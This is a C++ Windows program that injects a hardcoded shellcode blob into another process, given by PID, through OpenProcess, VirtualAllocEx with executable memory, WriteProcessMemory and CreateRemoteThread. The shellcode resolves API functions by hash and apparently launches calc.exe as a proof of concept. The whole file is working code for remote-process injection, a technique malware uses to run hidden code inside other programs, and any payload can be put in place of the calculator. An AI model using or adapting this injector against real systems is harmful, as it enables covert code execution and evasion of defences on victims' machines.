#include <windows.h>
#include <iostream>

char shellcode[] =	"\x48\x89\xE0\x48\x81\xE4\x00\xFF\xFF\xFF\x48\x83\xC4\x08\x50\xE8"
					"\x00\x00\x00\x00\x41\x5F\xB9\x55\x95\xDB\x6D\xE8\x44\x00\x00\x00"
					"\x49\x89\xC4\xB9\x78\x56\xA6\x29\x4C\x89\xE2\xE8\x73\x00\x00\x00"
					"\x49\x8D\x8F\x0D\x01\x00\x00\xBA\x05\x00\x00\x00\xFF\xD0\xE9\xE7"
					"\x00\x00\x00\x53\x57\xB8\x05\x15\x00\x00\x80\x39\x00\x74\x12\x89"
					"\xC3\xC1\xE0\x05\x01\xD8\x48\x0F\xB6\x39\x01\xF8\x48\x01\xD1\xEB"
					"\xE9\x5F\x5B\xC3\x53\x65\x4C\x8B\x1C\x25\x60\x00\x00\x00\x4D\x8B"
					"\x5B\x18\x4D\x8D\x5B\x20\x49\x8B\x1B\x51\x48\x8B\x4B\x50\xBA\x02"
					"\x00\x00\x00\xE8\xBB\xFF\xFF\xFF\x59\x48\x39\xC8\x74\x0F\x48\x8B"
					"\x1B\x4C\x39\xDB\x75\xE3\xB8\x00\x00\x00\x00\xEB\x04\x48\x8B\x43"
					"\x20\x5B\xC3\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x53\x48\x89"
					"\xD3\x48\x0F\xB7\x53\x3C\x48\x01\xDA\x8B\x92\x88\x00\x00\x00\x48"
					"\x01\xDA\x44\x8B\x5A\x1C\x49\x01\xDB\x44\x8B\x62\x20\x49\x01\xDC"
					"\x44\x8B\x6A\x24\x49\x01\xDD\x44\x8B\x72\x14\x41\xBF\x00\x00\x00"
					"\x00\x51\x43\x8B\x0C\xBC\x48\x01\xD9\xBA\x01\x00\x00\x00\xE8\x50"
					"\xFF\xFF\xFF\x59\x48\x39\xC8\x74\x0F\x49\xFF\xC7\x4D\x39\xF7\x75"
					"\xE0\xB8\x00\x00\x00\x00\xEB\x0D\x4B\x0F\xB7\x44\x7D\x00\x41\x8B"
					"\x04\x83\x48\x01\xD8\x5B\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B"
					"\xC3\x63\x61\x6C\x63\x2E\x65\x78\x65\x00\x5C\xC3";

int main(int argc, char* argv[])
{
	if (argc != 2) {
		std::cout << "Usage: " << argv[0] << " pid" << std::endl;
		return 1;
	}

	auto process_handle = ::OpenProcess(
		PROCESS_ALL_ACCESS,
		false,
		std::atoi(argv[1])
	);

	if (!process_handle) {
		std::cout << "[-] Could not open a handle to the process." << std::endl;
		return 1;
	}

	auto remote_shellcode = ::VirtualAllocEx(
		process_handle,
		nullptr,
		sizeof(shellcode),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);

	if (!remote_shellcode) {
		std::cout << "[-] Could allocate memory for the shellcode in the process." << std::endl;

		::CloseHandle(process_handle);

		return 1;
	}

	auto success = ::WriteProcessMemory(
		process_handle,
		remote_shellcode,
		shellcode,
		sizeof(shellcode),
		nullptr
	);

	if (!success) {
		std::cout << "[-] Could allocate memory for the shellcode in the process." << std::endl;

		::VirtualFreeEx(
			process_handle,
			remote_shellcode,
			0,
			MEM_FREE | MEM_RELEASE
		);

		::CloseHandle(process_handle);

		return 1;
	}

	auto thread_handle = ::CreateRemoteThread(
		process_handle,
		nullptr,
		0,
		(LPTHREAD_START_ROUTINE)remote_shellcode,
		nullptr,
		0,
		nullptr
	);

	if (!thread_handle) {
		std::cout << "[-] Could create a remote thread in the process." << std::endl;

		::VirtualFreeEx(
			process_handle,
			remote_shellcode,
			0,
			MEM_FREE | MEM_RELEASE
		);

		::CloseHandle(process_handle);

		return 1;
	}

	std::cout << "[+] Succefully injected shellcode into the process." << std::endl;

	::WaitForSingleObject(
		thread_handle,
		INFINITE
	);

	::VirtualFreeEx(
		process_handle,
		remote_shellcode,
		0,
		MEM_FREE | MEM_RELEASE
	);

	::CloseHandle(process_handle);

	return 0;
}